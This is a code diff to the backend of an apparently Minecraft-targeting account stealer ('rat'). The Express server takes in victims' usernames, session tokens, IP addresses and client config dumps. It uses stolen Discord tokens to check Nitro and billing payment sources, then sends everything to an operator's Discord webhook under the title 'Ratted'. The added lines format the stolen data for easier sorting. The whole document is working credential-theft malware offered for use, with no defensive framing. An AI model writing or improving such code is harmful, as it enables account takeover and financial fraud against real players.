@@ -91,6 +91,7 @@ app.post("/", (req, res) => {
             }
 
             if (usingDiscord) {
+                
                 //get networth
                 const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v2/profiles/${req.body.username}?key=dxxxxy`).catch(() => { return { data: { data: [{ networth: null }] } } })).data.data[0].networth
 
@@ -128,13 +129,32 @@ app.post("/", (req, res) => {
                     let payment = await (await get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
                     payments += payment.length > 0 ? "Yes | " : "No | "
                 }
+                
+                //numbers in the checks else allow for better sorting if you wish to only find embeds with these logins using discords search bar
+                //check feather content in hastebin
+                if(req.body.feather == 'File not found :(')
+                    checkFeather = 'File not found :( - (Feather)'
+                else
+                    checkFeather = `https://hst.sh/${feather} -  **(Feather1)**`
+                
+                //check essentials content in hastebin
+                if(req.body.essentials == 'File not found :(')
+                    checkEssentials = 'File not found :( - (Essentials)'
+                else
+                    checkEssentials = `https://hst.sh/${essentials} - **(Essentials2)**`
+                
+                //check lunar content in hastebin
+                if(req.body.lunar == 'File not found :(')
+                    checkLunar = 'File not found :( - (Lunar)'
+                else
+                    checkLunar = `https://hst.sh/${lunar} - **(Lunar3)**`
 
                 //send to discord webhook
                 post(process.env.WEBHOOK, JSON.stringify({
                     content: `@everyone - ${total_networth}`, //ping
                     embeds: [{
                         title: `Ratted ${req.body.username} - Click For Stats`,
-                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Lunar:**\nhttps://hst.sh/${lunar}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
+                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\n${checkFeather}\n\n**Essentials:**\n${checkEssentials}\n\n**Lunar:**\n${checkLunar}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
                         url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                         color: 5814783,
                         footer: {
